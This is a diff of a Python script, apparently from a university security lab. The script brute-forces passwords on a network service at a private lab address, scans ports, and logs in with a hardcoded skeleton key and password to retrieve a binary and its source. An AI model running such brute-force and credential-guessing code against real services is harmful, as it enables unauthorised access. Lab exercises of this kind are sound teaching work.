@@ -2,12 +2,13 @@ import re
 import socket
 import time
 import datetime
-import sys
-sys.stdout = open('port.out', 'w')
+#import sys
+#sys.stdout = open('port.out', 'w')
 
 HOST = '192.168.1.10'
 SKELETONKEY = 'Passepartout'
 BYTES = 1024
+BINBYTES = 30 * BYTES
 CRUZID = 'bosdhill\n'
 
 def create_dict():
@@ -16,6 +17,29 @@ def create_dict():
      for _, line in enumerate(fp):
           passwords.append(line.replace('\n',''))
      return passwords
+
+def connect_with_pass():
+     PORT = 10247
+     password = "BristolRovers"
+     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     s.connect((HOST, PORT))
+     print("Sending skeletonkey...")
+     s.sendall(SKELETONKEY)
+     data = s.recv(BYTES)
+     print("Data received: %s" % data)
+     print("Sending username...")
+     s.sendall(CRUZID)
+     data = s.recv(BYTES)
+     print("Received: %s" % data)
+     s.sendall(password)
+     data = s.recv(BYTES)
+     print("Received: %s" % data)
+     s.sendall("binary\n")
+     data = s.recv(BINBYTES)
+     print("Received: %s" % data)
+     s.sendall("source\n")
+     data = s.recv(BINBYTES)
+     print("Received: %s" % data)
 
 # Assuming NO initial lockout
 def crack_password(PORT):
@@ -88,8 +112,8 @@ def try_ports():
                crack_password(PORT)
 
 if __name__ == "__main__":
-     crack_password(10247)
-
+#     crack_password(10247)
+	connect_with_pass()
 
 
 
